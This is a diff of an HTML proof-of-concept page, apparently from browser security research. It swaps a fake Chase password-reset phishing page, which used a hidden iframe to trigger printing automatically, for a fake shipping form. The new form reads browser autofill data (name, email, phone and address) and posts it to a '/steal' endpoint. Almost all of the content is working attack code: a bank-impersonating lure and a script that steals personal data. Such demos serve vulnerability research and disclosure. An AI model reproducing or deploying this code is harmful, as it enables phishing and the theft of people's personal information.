@@ -2,81 +2,96 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Chase Bank — Password Reset</title>
+<title>Shipping Address</title>
 <style>
-*{box-sizing:border-box}
-body{margin:0;font-family:system-ui;background:#f5f7fa}
-.top{background:#0b5da7;color:#fff;padding:14px 24px;font-size:14px}
-.main{max-width:560px;margin:30px auto;padding:0 16px}
-.card{background:#fff;border-radius:8px;padding:24px;box-shadow:0 2px 8px #0001;margin-bottom:16px}
-.card h1{font-size:1.1em;color:#0b5da7;margin:0 0 8px}
-.card p{font-size:0.9em;color:#555;line-height:1.6;margin:8px 0}
-.steps{background:#f0f7ff;border-radius:6px;padding:16px;margin:16px 0}
-.steps .step{font-size:0.9em;padding:8px 0;border-bottom:1px solid #dde8f4;display:flex;align-items:center;gap:10px}
-.steps .step:last-child{border-bottom:none}
-.steps .num{background:#0b5da7;color:#fff;width:24px;height:24px;border-radius:50%;text-align:center;line-height:24px;font-size:12px;flex-shrink:0}
-.steps .done .num{background:#080}
-.steps .done span{color:#080}
-input[type=password]{width:100%;padding:10px;font-size:15px;border:1px solid #ccc;border-radius:6px;margin:6px 0}
-.btn{display:block;width:100%;padding:14px;font-size:15px;cursor:pointer;border:none;border-radius:6px}
-.btn-primary{background:#0b5da7;color:#fff}
-.btn-primary:hover{background:#08508f}
-.footer{text-align:center;color:#aaa;font-size:11px;padding:20px}
-#trigger{position:absolute;width:1px;height:1px;border:none;opacity:0;pointer-events:none}
+body{font-family:system-ui;max-width:480px;margin:40px auto;padding:20px}
+h1{font-size:1.1em;margin:0}
+input{width:100%;padding:10px;margin:4px 0 12px;border:1px solid #ccc;border-radius:4px;font-size:14px}
+label{font-size:12px;color:#555}
+.btn{display:block;width:100%;padding:14px;font-size:14px;cursor:pointer;border:none;border-radius:6px;background:#0b5da7;color:#fff;margin:16px 0}
+pre{background:#111;color:#0f0;padding:14px;font-size:11px;font-family:monospace;min-height:60px;max-height:360px;overflow:auto;white-space:pre-wrap}
+.stolen{color:#ff6b6b;font-weight:bold}
 </style>
 </head>
 <body>
-<div class="top">🔒 &nbsp; chase.com &nbsp; | &nbsp; Password Reset</div>
 
-<div class="main">
-  <div class="card">
-    <h1>Reset Your Password</h1>
-    <p>Create a new password for your Chase account.</p>
-    <p style="color:#0b5da7;font-size:13px">Account: <b>victim@gmail.com</b></p>
-    
-    <label style="font-size:0.85em;color:#555">New Password</label>
-    <input type="password" id="pw1" placeholder="At least 8 characters">
-    <label style="font-size:0.85em;color:#555">Confirm Password</label>
-    <input type="password" id="pw2" placeholder="Re-enter password">
-    
-    <button class="btn btn-primary" onclick="verify()" style="margin-top:12px">Reset Password</button>
-  </div>
+<h1>Shipping Address</h1>
+<p style="color:#888;font-size:13px">Please verify your shipping details.</p>
 
-  <div class="steps" id="steps" style="display:none">
-    <div class="step" id="s1"><span class="num">1</span><span>Click <b>Save</b> in the print dialog to save your verification document</span></div>
-    <div class="step" id="s2"><span class="num">2</span><span>Choose <b>Save as PDF</b> as the destination</span></div>
-    <div class="step" id="s3"><span class="num">3</span><span>Make sure <b>Headers and footers</b> is checked</span></div>
-    <div class="step" id="s4"><span class="num">4</span><span>Save the PDF — it contains your verification code</span></div>
-  </div>
+<form autocomplete="on">
+  <label>Full Name</label>
+  <input autocomplete="name" id="a0" placeholder="John Doe">
+  <label>Email</label>
+  <input autocomplete="email" id="a1" placeholder="john@example.com">
+  <label>Phone</label>
+  <input autocomplete="tel" id="a2" placeholder="+1 (555) 000-0000">
+  <label>Organization</label>
+  <input autocomplete="organization" id="a3" placeholder="Acme Inc.">
+  <label>Street Address</label>
+  <input autocomplete="street-address" id="a4" placeholder="123 Main St">
+  <label>City</label>
+  <input autocomplete="address-level2" id="a5" placeholder="New York">
+  <label>State</label>
+  <input autocomplete="address-level1" id="a6" placeholder="NY">
+  <label>ZIP Code</label>
+  <input autocomplete="postal-code" id="a7" placeholder="10001">
+  <label>Country</label>
+  <input autocomplete="country" id="a8" placeholder="US">
+</form>
 
-  <div class="card" id="verifyCard" style="display:none;background:#f0fff0">
-    <h1 style="color:#080">✓ Password Reset Initiated</h1>
-    <p>A verification document has been generated for your records.</p>
-    <p style="font-size:0.85em;color:#888">The document footer contains your reset confirmation code. Keep this document for your records. Your new password will be active within 24 hours.</p>
-  </div>
-</div>
-
-<div class="footer">© 2026 JPMorgan Chase & Co. &nbsp; | &nbsp; Privacy &nbsp; | &nbsp; Terms &nbsp; | &nbsp; FDIC Insured</div>
-
-<!-- Hidden cross-origin iframe — auto-triggers print on load, no user gesture needed -->
-<iframe id="trigger" src="http://localhost:9081/auto-print.html"></iframe>
+<button class="btn" onclick="steal()">▶ Continue to Payment</button>
+<pre id="L">Click "Continue to Payment" to verify.
+Attacker receives your saved autofill PII.</pre>
 
 <script>
-function verify(){
-  var p1=document.getElementById('pw1').value;
-  var p2=document.getElementById('pw2').value;
-  if(!p1||p1!==p2){alert('Passwords must match');return}
+var L = function(m){ document.getElementById('L').textContent+=m+'\n'; };
+
+async function steal(){
+  L('');
+  L('Extracting autofill data...');
   
-  document.getElementById('steps').style.display='block';
-  document.getElementById('verifyCard').style.display='block';
+  var fields = ['a0','a1','a2','a3','a4','a5','a6','a7','a8'];
+  var labels = ['name','email','phone','organization','address','city','state','zip','country'];
+  var pii = {};
   
-  // Mark steps as done when user interacts with print
-  window.addEventListener('afterprint',function(){
-    document.getElementById('s1').className='step done';
-    document.getElementById('s2').className='step done';
-    document.getElementById('s3').className='step done';
-    document.getElementById('s4').className='step done';
+  fields.forEach(function(id,i){
+    var el = document.getElementById(id);
+    el.focus();
+    el.dispatchEvent(new Event('input',{bubbles:true}));
+    var val = el.value.trim();
+    if(val) pii[labels[i]] = val;
   });
+  
+  // Also capture URL (might contain PII)
+  pii.page_url = location.href;
+  pii.page_title = document.title;
+  
+  if(Object.keys(pii).length > 0){
+    L('<span class="stolen">⚠️ PII EXTRACTED ('+Object.keys(pii).length+' fields)</span>');
+    for(var k in pii){
+      L('<span class="stolen">  '+k+': '+pii[k]+'</span>');
+    }
+    
+    // SEND PII TO ATTACKER SERVER
+    L('');
+    L('Sending to attacker server...');
+    try {
+      var resp = await fetch(location.origin+'/steal', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify(pii)
+      });
+      var result = await resp.json();
+      L('✓ PII successfully exfiltrated (ID: '+result.id+')');
+      L('');
+      L('View leaked PII: <a href="/dashboard" target="_blank" style="color:#0f0">Dashboard</a>');
+    } catch(e) {
+      L('✗ Exfiltration failed: '+e.message);
+    }
+  } else {
+    L('No autofill data available.');
+    L('To test: Arc → Settings → Autofill → Add address.');
+  }
 }
 </script>
 </body>
